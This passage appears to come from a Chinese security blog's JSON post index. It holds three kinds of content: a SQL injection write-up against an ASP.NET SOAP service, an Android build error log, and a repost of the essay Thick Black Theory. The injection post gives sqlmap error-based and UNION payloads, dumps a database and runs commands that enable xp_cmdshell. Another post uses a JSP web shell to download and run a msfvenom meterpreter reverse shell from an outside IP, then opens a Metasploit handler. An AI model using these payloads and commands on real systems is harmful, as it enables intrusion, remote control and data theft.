MicrosoftIIS7.5,ASP.NETback-endDBMS:MicrosoftSQLServer2008[11:04:24][WARNING]HTTPerrorcodesdetectedduringrun:500(InternalServerError)-19times[11:04:24][INFO]fetcheddataloggedtotextfilesunder'/root/.sqlmap/output/underattack-host'[*]shuttingdownat11:04:24注入payload单独发出来，如下：---Parameter:SOAP#1*((custom)POST)Type:error-basedTitle:MicrosoftSQLServer/SybaseANDerror-based-WHEREorHAVINGclause(IN)Payload:&lt;SOAP-ENV:Envelopexmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"xmlns:m0=\"http://tempuri.org/\"xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"xmlns:urn=\"http://tempuri.org/\"&gt;&lt;SOAP-ENV:Header/&gt;&lt;SOAP-ENV:Body&gt;&lt;urn:getcode&gt;&lt;urn:ins&gt;1'AND1597IN(SELECT(CHAR(113)+CHAR(112)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT(CASEWHEN(1597=1597)THENCHAR(49)ELSECHAR(48)END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(120)+CHAR(113)))AND'DZUD'='DZUD&lt;/urn:ins&gt;&lt;/urn:getcode&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;Type:UNIONqueryTitle:GenericUNIONquery(NULL)-7columnsPayload:&lt;SOAP-ENV:Envelopexmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"xmlns:m0=\"http://tempuri.org/\"xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"xmlns:urn=\"http://tempuri.org/\"&gt;&lt;SOAP-ENV:Header/&gt;&lt;SOAP-ENV:Body&gt;&lt;urn:getcode&gt;&lt;urn:ins&gt;1'UNIONALLSELECTCHAR(113)+CHAR(112)+CHAR(98)+CHAR(122)+CHAR(113)+CHAR(72)+CHAR(117)+CHAR(78)+CHAR(90)+CHAR(84)+CHAR(69)+CHAR(80)+CHAR(98)+CHAR(85)+CHAR(102)+CHAR(80)+CHAR(86)+CHAR(81)+CHAR(73)+CHAR(83)+CHAR(102)+CHAR(106)+CHAR(101)+CHAR(70)+CHAR(113)+CHAR(101)+CHAR(109)+CHAR(68)+CHAR(86)+CHAR(76)+CHAR(84)+CHAR(73)+CHAR(122)+CHAR(99)+CHAR(66)+CHAR(82)+CHAR(119)+CHAR(66)+CHAR(78)+CHAR(75)+CHAR(98)+CHAR(102)+CHAR(107)+CHAR(99)+CHAR(88)+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL--aKgd&lt;/urn:ins&gt;&lt;/urn:getcode&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;---我们可以偷懒一下，直接payload拿过来看看反包有什么不一样的地方~看到差别了吗。Type:报错注入（error-based）:HTTP/1.1500InternalServerErrorCache-Control:privateContent-Type:text/xml;charset=utf-8Server:Microsoft-IIS/7.5X-AspNet-Version:4.0.30319X-Powered-By:ASP.NETContent-Length:459&lt;?xmlversion=\"1.0\"encoding=\"utf-8\"?&gt;&lt;soap:Envelopexmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;&lt;soap:Body&gt;&lt;soap:Fault&gt;&lt;faultcode&gt;soap:Server&lt;/faultcode&gt;&lt;faultstring&gt;Serverwasunabletoprocessrequest.---&amp;gt;在将varchar值'qpbzq1qzkxq'转换成数据类型&lt;/faultstring&gt;&lt;detail/&gt;&lt;/soap:Fault&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;#=======================================================================================#=======================================================================================Type:联合查询（UNIONquery），输出的信息比较多，限于篇幅，放上一些数据：HTTP/1.1200OKCache-Control:private,max-age=0Content-Type:text/xml;charset=utf-8Vary:Accept-EncodingServer:Microsoft-IIS/7.5X-AspNet-Version:4.0.30319X-Powered-By:ASP.NETContent-Length:20111&lt;c_me_com&gt;10005&lt;/c_me_com&gt;&lt;c_me_no&gt;14&lt;/c_me_no&gt;&lt;c_me_bt&gt;10.11.201.233&lt;/c_me_bt&gt;&lt;c_me_command&gt;0&lt;/c_me_command&gt;&lt;c_me_lenght&gt;2&lt;/c_me_lenght&gt;&lt;c_me_start&gt;2000&lt;/c_me_start&gt;&lt;c_me_lastvalue&gt;0&lt;/c_me_lastvalue&gt;&lt;c_me_maxstep&gt;50&lt;/c_me_maxstep&gt;&lt;c_me_webcode&gt;com7.db001.db001t&lt;/c_me_webcode&gt;&lt;c_me_by19&gt;0.00&lt;/c_me_by19&gt;&lt;c_me_by20&gt;1&lt;/c_me_by20&gt;&lt;c_me_lastdate4&gt;2018-08-08T05:00:24.677+08:00&lt;/c_me_lastdate4&gt;&lt;c_me_lastvalue4&gt;313&lt;/c_me_lastvalue4&gt;&lt;c_me_lastdate3&gt;2018-08-08T06:03:06.137+08:00&lt;/c_me_lastdate3&gt;&lt;c_me_lastvalue3&gt;313&lt;/c_me_lastvalue3&gt;&lt;c_me_lastdate2&gt;2018-08-08T07:05:47.173+08:00&lt;/c_me_lastdate2&gt;&lt;c_me_lastvalue2&gt;313&lt;/c_me_lastvalue2&gt;&lt;c_me_lastdate1&gt;2018-08-08T08:08:28.543+08:00&lt;/c_me_lastdate1&gt;&lt;c_me_lastvalue1&gt;313&lt;/c_me_lastvalue1&gt;&lt;c_me_lastsuredate&gt;2018-08-08T11:11:05.27+08:00&lt;/c_me_lastsuredate&gt;&lt;c_me_lastsurevalue&gt;313&lt;/c_me_lastsurevalue&gt;&lt;/d2&gt;&lt;/ds&gt;&lt;/diffgr:diffgram&gt;&lt;/getcodeResult&gt;&lt;/getcodeResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;常规查询：当然在平常注入的过程中，不仅仅存在上述的注入，我们更多的是常见的盲注、联合查询或者是布尔盲注、时间盲注等等；我们这里举得例子同样存在，当然也是万能的awvs跑出来的：DiscoveredbyBlindSQLInjectionURLencodedPOSTinputinswassettoeizSls查看不同输入的符号对应的true、flase值，单数的%27输入进去我们可以看到是flase，双数输入进去则为true：462'=&gt;ERROR462''=&gt;OKGwHgee'''=&gt;ERROR7Ahb38''''=&gt;OKCXBMlX'''''=&gt;ERRORxgBDwt''''''=&gt;OKeizSls'''''''=&gt;ERROR老方法，直接SQLMAP跑~POST/WebService1.asmx/getcodeHTTP/1.1Content-Type:application/x-www-form-urlencodedX-Requested-With:XMLHttpRequestReferer:http://vuln_ip:8081/WebService1.asmx?WSDLAccept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding:gzip,deflateContent-Length:17Host:vuln_ip:8081User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/73.0.3683.103Safari/537.36Connection:Keep-aliveins=eizSls跑出来也是一样的效果，当然是一样的注入点，都是getcode这个功能接口跑的数据：POSTparameter'ins'isvulnerable.Doyouwanttokeeptestingtheothers(ifany)?[y/N]Nsqlmapidentifiedthefollowinginjectionpoint(s)withatotalof47HTTP(s)requests:---Parameter:ins(POST)Type:error-basedTitle:MicrosoftSQLServer/SybaseANDerror-based-WHEREorHAVINGclause(IN)Payload:ins=eizSls'AND7541IN(SELECT(CHAR(113)+CHAR(120)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT(CASEWHEN(7541=7541)THENCHAR(49)ELSECHAR(48)END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)))AND'EJIL'='EJILType:UNIONqueryTitle:GenericUNIONquery(NULL)-7columnsPayload:ins=eizSls'UNIONALLSELECTNULL,CHAR(113)+CHAR(120)+CHAR(113)+CHAR(107)+CHAR(113)+CHAR(67)+CHAR(85)+CHAR(78)+CHAR(111)+CHAR(108)+CHAR(112)+CHAR(72)+CHAR(81)+CHAR(82)+CHAR(108)+CHAR(89)+CHAR(68)+CHAR(67)+CHAR(99)+CHAR(105)+CHAR(109)+CHAR(105)+CHAR(86)+CHAR(121)+CHAR(99)+CHAR(122)+CHAR(90)+CHAR(109)+CHAR(112)+CHAR(98)+CHAR(88)+CHAR(89)+CHAR(68)+CHAR(90)+CHAR(101)+CHAR(71)+CHAR(100)+CHAR(118)+CHAR(81)+CHAR(114)+CHAR(83)+CHAR(101)+CHAR(90)+CHAR(117)+CHAR(100)+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL--HqcH---信息搜集康康user，发现是dbo。SQLSERVER中[dbo]的解释：webserveroperatingsystem:Windows2008R2or7webapplicationtechnology:ASP.NET4.0.30319,MicrosoftIIS7.5,ASP.NETback-endDBMS:MicrosoftSQLServer2008[11:16:02][INFO]callingMicrosoftSQLServershell.Toquittype'x'or'q'andpressENTERsql-shell&gt;user[11:16:13][INFO]fetchingSQLqueryoutput:'user'user:'dbo'看一下服务器是否站库分离：sql-shell&gt;select@@servername;[11:17:21][INFO]fetchingSQLSELECTstatementqueryoutput:'select@@servername'select@@servername;:'WIN-VO157IKGT24'sql-shell&gt;selecthost_name();[11:17:25][INFO]fetchingSQLSELECTstatementqueryoutput:'selecthost_name()'selecthost_name();:'WIN-VO157IKGT24'两个都是WIN-VO157IKGT24所以应该没有站库分离。看一下数据库版本号sql-shell&gt;Select@@version[11:17:34][INFO]fetchingSQLSELECTstatementqueryoutput:'Select@@version'Select@@version:'MicrosoftSQLServer2008R2(RTM)-10.50.1600.1(X64)\\n\\tApr2201015:48:46\\n\\tCopyright(c)MicrosoftCorporation\\n\\tStandardEdition(64-bit)onWindowsNT6.1&lt;X64&gt;(Build7601:ServicePack1)\\n'root@#:/home/tool/sqlmap-data/wsdl-inject#sqlmap-rnet-test1.txt--batch--dbs---[11:04:34][INFO]theback-endDBMSisMicrosoftSQLServerwebserveroperatingsystem:Windows2008R2or7webapplicationtechnology:ASP.NET4.0.30319,MicrosoftIIS7.5,ASP.NETback-endDBMS:MicrosoftSQLServer2008[11:04:34][INFO]fetchingdatabasenamesavailabledatabases[7]:[*]master[*]model[*]msdb[*]ReportServer[*]ReportServerTempDB[*]tempdb[*]ytems[11:04:35][INFO]fetcheddataloggedtotextfilesunder'/root/.sqlmap/output/underattack-host'[*]shuttingdownat11:04:35提权dbccaddextendedproc(\"sp_oacreate\",\"odsole70.dll\");dbccaddextendedproc(\"xp_cmdshell\",\"xplog70.dll\");tobecontinued；"
  },

  {
    "title"    : "「安卓」:使用rootCloak绕过root权限监测",
    "category" : "",
    "tags"     : "笔记, Android Reverse",
    "url"      : "/blog/2020/use-RootCloak-to-hidden-your-root/",
    "date"     : "May 15, 2020",
    "content"  : "gradle打包https://blog.csdn.net/EthanCo/article/details/52064044https://www.kutu66.com/GitHub/article_105897https://jingyan.baidu.com/article/c45ad29c20a123051753e2af.html.\\gradlew.battaskActivecodepage:65001FailedtonotifyProjectEvaluationListener.afterEvaluate(),butprimaryconfigurationfailuretakesprecedence.java.lang.RuntimeException:SDKlocationnotfound.Definelocationwithsdk.dirinthelocal.propertiesfileorwithanANDROID_HOMEenvironmentvariable.atorg.gradle.initialization.DefaultGradleLauncher.doBuildStages(DefaultGradleLauncher.java:122)atorg.gradle.initialization.DefaultGradleLauncher.access$200(DefaultGradleLauncher.java:32)atorg.gradle.initialization.DefaultGradleLauncher$1.create(DefaultGradleLauncher.java:99)atorg.gradle.initialization.DefaultGradleLauncher$1.create(DefaultGradleLauncher.java:93)atorg.gradle.internal.progress.DefaultBuildOperationExecutor.run(DefaultBuildOperationExecutor.java:90)atorg.gradle.internal.progress.DefaultBuildOperationExecutor.run(DefaultBuildOperationExecutor.java:62)atorg.gradle.initialization.DefaultGradleLauncher.doBuild(DefaultGradleLauncher.java:93)atorg.gradle.initialization.DefaultGradleLauncher.run(DefaultGradleLauncher.java:82)atorg.gradle.launcher.exec.InProcessBuildActionExecuter$DefaultBuildController.run(InProcessBuildActionExecuter.java:94)atorg.gradle.tooling.internal.provider.ExecuteBuildActionRunner.run(ExecuteBuildActionRunner.java:28)atorg.gradle.launcher.exec.ChainingBuildActionRunner.run(ChainingBuildActionRunner.java:35)atorg.gradle.launcher.exec.InProcessBuildActionExecuter.execute(InProcessBuildActionExecuter.java:43)atorg.gradle.launcher.exec.InProcessBuildActionExecuter.execute(InProcessBuildActionExecuter.java:28)atorg.gradle.launcher.exec.ContinuousBuildActionExecuter.execute(ContinuousBuildActionExecuter.java:78)atorg.gradle.launcher.exec.ContinuousBuildActionExecuter.execute(ContinuousBuildActionExecuter.java:48)atorg.gradle.launcher.exec.DaemonUsageSuggestingBuildActionExecuter.execute(DaemonUsageSuggestingBuildActionExecuter.java:51)atorg.gradle.launcher.exec.DaemonUsageSuggestingBuildActionExecuter.execute(DaemonUsageSuggestingBuildActionExecuter.java:28)atorg.gradle.launcher.cli.RunBuildAction.run(RunBuildAction.java:43)atorg.gradle.internal.Actions$RunnableActionAdapter.execute(Actions.java:170)atorg.gradle.launcher.cli.CommandLineActionFactory$ParseAndBuildAction.execute(CommandLineActionFactory.java:237)atorg.gradle.launcher.cli.CommandLineActionFactory$ParseAndBuildAction.execute(CommandLineActionFactory.java:210)atorg.gradle.launcher.cli.JavaRuntimeValidationAction.execute(JavaRuntimeValidationAction.java:35)atorg.gradle.launcher.cli.JavaRuntimeValidationAction.execute(JavaRuntimeValidationAction.java:24)atorg.gradle.launcher.cli.CommandLineActionFactory$WithLogging.execute(CommandLineActionFactory.java:206)atorg.gradle.launcher.cli.CommandLineActionFactory$WithLogging.execute(CommandLineActionFactory.java:169)atorg.gradle.launcher.cli.ExceptionReportingAction.execute(ExceptionReportingAction.java:33)atorg.gradle.launcher.cli.ExceptionReportingAction.execute(ExceptionReportingAction.java:22)atorg.gradle.launcher.Main.doAction(Main.java:33)atorg.gradle.launcher.bootstrap.EntryPoint.run(EntryPoint.java:45)atsun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethod)atsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)atsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)atjava.lang.reflect.Method.invoke(Method.java:498)atorg.gradle.launcher.bootstrap.ProcessBootstrap.runNoExit(ProcessBootstrap.java:54)atorg.gradle.launcher.bootstrap.ProcessBootstrap.run(ProcessBootstrap.java:35)atorg.gradle.launcher.GradleMain.main(GradleMain.java:23)atsun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethod)atsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)atsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)atjava.lang.reflect.Method.invoke(Method.java:498)atorg.gradle.wrapper.BootstrapMainStarter.start(BootstrapMainStarter.java:33)atorg.gradle.wrapper.WrapperExecutor.execute(WrapperExecutor.java:130)atorg.gradle.wrapper.GradleWrapperMain.main(GradleWrapperMain.java:48)FAILURE:Buildfailedwithanexception.https://blog.csdn.net/coder_ken/article/details/50853927"
  },

  {
    "title"    : "「渗透」:一句话反弹docker-shell",
    "category" : "",
    "tags"     : "docker, Web, 渗透",
    "url"      : "/blog/2020/docker-reverse-shell-by-one/",
    "date"     : "Apr 27, 2020",
    "content"  : "一句话木马反弹shell前提：现在情况是已经上传了一句话木马，可以执行命令如：ls,pwd,whoami等；问题在于，不管用python、bash还是perl都反弹不了（如下），偷不了懒，就上msf把。http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=pwd/u01/oracle/user_projects/domains/base_domainhttp://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=whoamioraclemsf生成shell文件msfvenom先生成反弹shell文件，赋权。root@iZj6cgn7odv59wmjjhe6zwZ:~##msfvenom-plinux/x64/meterpreter_reverse_tcpLHOST=47.52.233.92LPORT=1234-felf&gt;shell.elf[-]Noplatformwasselected,choosingMsf::Module::Platform::Linuxfromthepayload[-]Noarchselected,selectingarch:x64fromthepayloadNoencoderorbadcharsspecified,outputtingrawpayloadPayloadsize:1046632bytesFinalsizeofelffile:1046632bytesroot@iZj6cgn7odv59wmjjhe6zwZ:~##chmod777shell.elf#http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=ls#测试一下一句话木马，是可以执行命令的：total1100drwxr-x---15oracleoracle4096Apr2708:06.drwxr-x---3oracleoracle4096Apr2500:23..drwxr-x---2oracleoracle4096Apr2500:23autodeploydrwxr-x---6oracleoracle4096Apr2500:23bindrwxr-x---3oracleoracle4096Apr2500:23commondrwxr-x---9oracleoracle4096Apr2500:24configdrwxr-x---2oracleoracle4096Apr2500:23console-ext-rw-r-----1oracleoracle234Apr2500:23derby.log-rw-r-----1oracleoracle257Apr2500:24edit.lok-rw-r-----1oracleoracle327Jul192017fileRealm.propertiesdrwxr-x---3oracleoracle4096Apr2500:23init-infodrwxr-x---2oracleoracle4096Apr2500:23libdrwxr-x---2oracleoracle4096Apr2500:23nodemanagerdrwxr-x---3oracleoracle4096Apr2500:23orchestrationdrwxr-x---2oracleoracle4096Apr2601:39originaldrwxr-x---2oracleoracle4096Apr2500:23securitydrwxr-x---3oracleoracle4096Apr2500:23servers-rwxr-x---1oracleoracle261Apr2500:23startWebLogic.shdrwxr-x---3oracleoracle4096Apr2509:49tmp下载shell文件执行在一句话木马上执行下载命令，Wget和Curl都可以，一般linux机器上都自带下载工具#http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=curl-oshell.elfhttp://ip/shell.elf#等待下载完毕；继续赋权chmod777shell.elf#在查看一下：total1100drwxr-x---15oracleoracle4096Apr2708:06.drwxr-x---3oracleoracle4096Apr2500:23..drwxr-x---2oracleoracle4096Apr2500:23autodeploydrwxr-x---6oracleoracle4096Apr2500:23bindrwxr-x---3oracleoracle4096Apr2500:23commondrwxr-x---9oracleoracle4096Apr2500:24configdrwxr-x---2oracleoracle4096Apr2500:23console-ext-rw-r-----1oracleoracle234Apr2500:23derby.log-rw-r-----1oracleoracle257Apr2500:24edit.lok-rw-r-----1oracleoracle327Jul192017fileRealm.propertiesdrwxr-x---3oracleoracle4096Apr2500:23init-infodrwxr-x---2oracleoracle4096Apr2500:23libdrwxr-x---2oracleoracle4096Apr2500:23nodemanagerdrwxr-x---3oracleoracle4096Apr2500:23orchestrationdrwxr-x---2oracleoracle4096Apr2601:39originaldrwxr-x---2oracleoracle4096Apr2500:23securitydrwxr-x---3oracleoracle4096Apr2500:23servers-rwxrwxrwx1oracleoracle1046632Apr2708:06shell.elf-rwxr-x---1oracleoracle261Apr2500:23startWebLogic.shdrwxr-x---3oracleoracle4096Apr2509:49tmpshell流量接入我们发现已经成功下载了反弹shell的msf文件，直接执行http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=./shell.elf，执行前别忘了在服务器上监听端口。#msfconsolemsf5&gt;useexploit/multi/handlermsf5exploit(multi/handler)&gt;setPAYLOADlinux/x64/meterpreter_reverse_tcpPAYLOAD=&gt;linux/x64/meterpreter_reverse_tcpmsf5exploit(multi/handler)&gt;setLHOST0.0.0.0LHOST=&gt;0.0.0.0msf5exploit(multi/handler)&gt;setLPORT1234LPORT=&gt;1234msf5exploit(multi/handler)&gt;run[*]StartedreverseTCPhandleron0.0.0.0:1234执行完就可以看到建立连接的流量接入了：[*]Meterpretersession1opened(172.31.116.237:1234-&gt;59.110.152.168:44832)at2020-04-2716:08:48+0800#下一步：meterpreter&gt;shellProcess460created.Channel1created.whoamioracle#获得一个交互式shellpython-c'importpty;pty.spawn(\"/bin/sh\")'sh-4.2$whoamiwhoamioraclesh-4.2$sudosusudosush:sudo:commandnotfoundpython-c'importpty;pty.spawn(\"/bin/bash\")'[oracle@5c6fe690ac22base_domain]$pwdpwd/u01/oracle/user_projects/domains/base_domain[oracle@5c6fe690ac22base_domain]$lslsautodeployconsole-extinit-infooriginalstartWebLogic.shbinderby.loglibsecuritytmpcommonedit.loknodemanagerserversconfigfileRealm.propertiesorchestrationshell.elf[oracle@5c6fe690ac22base_domain]$uname-auname-aLinux5c6fe690ac223.10.0-1062.12.1.el7.x86_64##1SMPTueFeb423:02:59UTC2020x86_64x86_64x86_64GNU/Linux以上。"
  },

  {
    "title"    : "《厚黑学》:转载",
    "category" : "",
    "tags"     : "笔记, 诗文, 经典",
    "url"      : "/top/2020/hou-hei-xue-post/",
    "date"     : "Apr 10, 2020",
    "content"  : "《厚黑学》·李宗吾·(1879-1944)　　我自读书识字以来，就想为英雄豪杰，求之四书五经，茫无所得，求之诸子百家，与夫廿四史，仍无所得，以为古之为英雄豪杰者，必有不传之秘，不过吾人生性愚鲁，寻他不出罢了。穷索冥搜，忘寝废食，如是者有年，一旦偶然想起三国时几个人物，不觉恍然大悟曰：得之矣，得之矣，古之为英雄豪杰者，不过面厚心黑而已。　　三国英雄，首推曹操，他的特长，全在心黑：他杀吕伯奢，杀孔融，杀杨修，杀董承伏完，又杀皇后皇子，悍然不顾，并且明目张胆地说：“宁我负人，毋人负我。”心子之黑，真是达于极点了。有了这样本事，当然称为一世之雄了。　　其次要算刘备，他的特长，全在于脸皮厚：他依曹操，依吕布，依刘表，依孙权，依袁绍，东窜西走，寄人篱下，恬不为耻，而且生平善哭，做三国演义的人，更把他写得维妙维肖，遇到不能解决的事情，对人痛哭一场，立即转败为功，所以俗语有云：“刘备的江山，是哭出来的。”这也是一个有本事的英雄。他和曹操，可称双绝；当著他们煮酒论英雄的时候，一个心子最黑，一个脸皮最厚，一堂晤对，你无奈我何，我无奈你何，环顾袁本初诸人，卑鄙不足道，所以曹操说：“天下英雄，惟使君与操耳。”煮酒论英雄，天下英雄，惟使君与操耳，商业互吹耳。^_^　　此外还有一个孙权，他和刘备同盟，并且是郎舅之亲，忽然夺取荆州，把关羽杀了，心之黑，仿佛曹操，无奈黑不到底，跟著向蜀请和，其黑的程度，就要比曹操稍逊一点。他与曹操比肩称雄，抗不相下，忽然在曹丞驾下称臣，脸皮之厚，仿佛刘备，无奈厚不到底，跟著与魏绝交，其厚的程度也比刘备稍逊一点。他虽是黑不如操，厚不如备，却是二者兼备，也不能不算是一个英雄。他们三个人，把各人的本事施展开来，你不能征服我，我不能服你，那时候的天下，就不能不分而为三。　　后来曹操、刘备、孙权，相继死了，司马氏父子乘时崛起，他算是受了曹刘诸人的薰陶，集厚黑学之大成，他能欺人寡妇孤儿，心之黑与曹操一样；能够受巾帼之辱，脸皮之厚，还更甚于刘备；我读史见司马懿受辱巾帼这段事，不禁拍案大叫：“天下归司马氏矣！”所以得到了这个时候，天下就不得不统一，这都是“事有必至，理有固然”。　　诸葛武候，天下奇才，是三代下第一人，遇著司马懿还是没有办法，他下了”鞠躬尽瘁，死而后已”的决心，终不能取得中原尺寸之地，竟至呕血而死，可见王佐之才，也不是厚黑名家的敌手。　　我把他几个人物的事，反复研究，就把这千古不传的秘诀，发现出来。一部二十四史，可一以贯之：“厚黑而己。”兹再举汉的事来证明一下。　　项羽拔山盖世之雄。咽鸣叱吒，千人皆废，为什么身死东城，为天下笑！他失败的原因，韩信所说：“妇人之仁，匹夫之勇”两句话，包括尽了。妇人之仁，是心有所不忍，其病根在心子不黑；匹夫之勇，是受不得气，其病根在脸皮不厚。鸿门之宴，项羽和刘邦，同坐一席，项庄已经把剑取出来了，只要在刘邦的颈上一划，“太高皇帝”的招牌，立刻可以挂出，他偏偏徘徊不忍，竟被刘邦逃走。垓下之败，如果渡过乌江，卷土重来，尚不知鹿死谁手？他偏偏又说：“籍与江东子弟八千人，渡江而西，今无一人还，纵江东父兄，怜我念我，我何面目见之。纵彼不言，籍独不愧于心乎？”这些话，真是大错特错！他一则曰：“无面见人”；再则曰：“有愧于心。”究竟高人的面，是如何长起得，高人的心，是如何生起得？也不略加考察，反说：“此天亡我，非战之罪”，恐怕上天不能任咎吧。　　我们又拿刘邦的本事研究一下，史记载：项羽问汉王曰：“天下匈匈数岁，徒吾两人耳，愿与汉王挑战决雌雄。”汉王笑谢曰：“吾宁斗智不斗力。”请问笑谢二字从何生出？刘邦见郦生时，使两女子洗脚，郦生责他倨见长者，他立刻辍为之谢。还有自己的父亲，身在俎下，他要分一杯羹；亲生儿女，孝惠鲁元，楚兵追至，他能够推他下车；后来又杀韩信，杀彭越，“鸟尽弓藏；兔死狗烹”，请问刘邦的心子，是何状态，岂是那“妇人之仁，匹夫之勇”的项羽，所能梦见？太史公著本纪，只说刘邦隆准龙颜，项羽是重瞳子，独于二人的面皮厚薄，心之黑白，没有一字提及，未免有愧良史。　　刘邦的面，刘邦的心，比较别人特别不同，可称天纵之圣。黑之一字，真是”生和安行，从心所欲不逾矩”，至于厚字方面，还加了点学历，他的业师，就是三杰中的张良，张良的业师，是圮上老人，他们的衣钵真传，是彰彰可考的。圮上受书一事，老人种种作用，无非教张良脸皮厚罢了。这个道理，苏东坡的留候论，说得很明白。张良是有夙根的人，一经指点，言下顿悟，故老人以王者师期之。这种无上妙法，断非钝根的人所能了解，所以史记上说：“良为他人言，皆不省，独沛公善之，良曰，沛公殆天授也。”可见这种学问，全是关乎资质，明师固然难得，好徒弟也不容易寻找。韩信求封齐王的时候，刘邦几乎误会，全靠他的业师在旁指点，仿佛现在学校中，教师改正学生习题一般。以刘邦的天资，有时还有错误，这种学问的精深，就此可以想见了。　　刘邦天资既高，学历又深，把流俗所传君臣、父子、兄弟、夫妇、朋友五伦，一一打破，又把礼义廉耻，扫除净尽，所以能够平荡群雄，统一海内，一直经过了四百几十年，他那厚黑的余气，方才消灭，汉家的系统，于是乎才断绝了。　　楚汉的时候，有一个人，脸皮最厚，心不黑，终归失败，此人为谁？就是人人知道的韩信。胯下之辱，他能够忍受，厚的程度，不在刘邦之下。无奈对于黑字，欠了研究；他为齐王时，果能听蒯通的话当然贵不可言，他偏偏系念著刘邦解衣推食的恩惠，冒冒昧昧地说：”衣人之衣者，怀人之忧；食人之食者，死人之事。”后来长乐钟室，身首异处，夷及九族。真是咎由自取，他讥诮项羽是妇人之仁，可见心子不黑，作事还要失败的，这个大原则，他本来也是知道的，但他自己也在这里失败，这也怪韩信不得。　　同时又有一个人，心最黑，脸皮不厚，也归失败，此人也是人人知道的，姓范名增。刘邦破咸阳，系子婴，还军坝上，秋毫不犯，范增千方百计，总想把他置之死地，心子之黑，也同刘邦仿佛；无奈脸皮不厚，受不得气，汉用陈平计，间疏楚君王，增大怒求去，归来至彭城，疽后背死，大凡做大事的人，那有动辄生气的道理？“增不去，项羽不亡”，他若能隐忍一下，刘邦的破绽很多。随便都可以攻进去。他忿然求去，把自己的老命，把项羽的江山，一齐送掉，因小不忍，坏了大事，苏东坡还称他为人杰，未免过誉？　　据上面的研究，厚黑学这种学问，法子很简单，用起来却很神妙，小用小效，大用大效，刘邦司马懿把它学完了，就统一天下；曹操刘备各得一偏，也能称孤道寡，割据争雄；韩信、范增，也是各得一偏，不幸生不逢时，偏偏与厚黑兼全的刘邦，并世而生，以致同归失败。但是他们在生的时候，凭其一得之长，博取王候将相，炫赫一时，身死之后，史传中也占了一席之地，后人谈到他们的事迹，大家都津津乐道，可见厚黑学终不负人。　　上天生人，给我们一张脸，而厚即在其中，给我们一颗心，而黑即在其中。从表面上看去，广不数寸，大不盈掬，好象了无奇异，但，若精密的考察，就知道它的厚是无限的，它的黑是无比的，凡人世的功名富贵、宫室妻妾、衣服车马，无一不从这区区之地出来，造物生人的奇妙，真是不可思议。钝根众生，身有至宝，弃而不用，可谓天下之大愚。　　　厚黑学共分三步功夫，第一步是“厚如城墙，黑如煤炭”。起初的脸皮，好象一张纸，由分而寸，由尺而丈，就厚如城墙了。最初心的颜色，作乳白状，由乳色而炭色、而青蓝色，再进而就黑如煤炭了。到了这个境界，只能算初步功夫；因为城墙虽厚，轰以大炮，还是有攻破的可能；煤炭虽黑，但颜色讨厌，众人都不愿挨近它。所以只算是初步的功夫。　　第二步是“厚而硬，黑而亮”。深于厚学的人，任你如何攻打，他一点不动，刘备就是这类人，连曹操都拿他没办法。深于黑学的人，如退光漆招牌，越是黑，买主越多，曹操就是这类人，他是著名的黑心子，然而中原名流，倾心归服，真可谓“心子漆黑，招牌透亮”，能够到第二步，固然同第一步有天渊之别，但还露了迹象，有形有色，所以曹操的本事，我们一眼就看出来了。　　第三步是“厚而无形，黑而无色”。至厚至黑，天上后世，皆以为不厚不黑，这个境界，很不容易达到，只好在古之大圣大贤中去寻求。有人问：“这种学问，哪有这样精深？”我说：“儒家的中庸，要讲到‘无声无臭’方能终止；学佛的人，要讲到‘菩提无树，明镜非台’，才算正果；何况厚黑学是千古不传之秘，当然要做到‘无形无色’，才算止境”。　　总之，由三代以至于今，王候将相，豪杰圣贤，不可胜数，苟其事之有成，无一不出于此；书册俱在，事实难诬，读者倘能本我指示的途径，自去搜寻，自然左右逢源，头头是道。[作者简介]:李宗吾，1879年（清光绪五年）生于成都，一度任国民党政府官员、四川大学教授，后成为自由撰稿人，于1944年去世。奇书《厚黑学》成稿于1917年。曾连载于成都《公论日报》，后由故未能载完。几经周折，在1934年正式出版。"
  },

  {
    "title"    : "「Terminal」:pip报错&#39;unkown-encoding&#39;",
    "category" : "",
